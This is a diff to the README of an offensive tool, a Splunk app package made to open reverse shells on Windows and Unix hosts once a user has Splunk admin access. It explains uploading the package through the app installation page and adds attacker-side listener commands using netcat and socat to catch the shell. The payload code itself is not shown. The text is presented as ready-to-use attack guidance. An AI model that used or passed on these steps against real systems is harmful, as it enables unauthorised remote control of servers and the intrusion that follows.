@@ -3,7 +3,7 @@ A simple splunk package for obtaining reverse shells on both Windows and most *n
 
 # requirements 
 * splunk administrative access
-* a netcat listener on the attacking machine 
+* a netcat / socat listener on the attacking machine 
 
 
 # how to use
@@ -49,5 +49,12 @@ mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
 ```
 
 * Launch your listener and upload this package via the app installation page. 
+
+```
+Listener options
+nc -nlvp "port"
+or 
+socat `tty`,raw,echo=0 tcp-listen:"port"
+```
 
 Note: I have had to restart the splunk service on unix type machines in my testing for this to work. No restarts are needed on windows machine. 
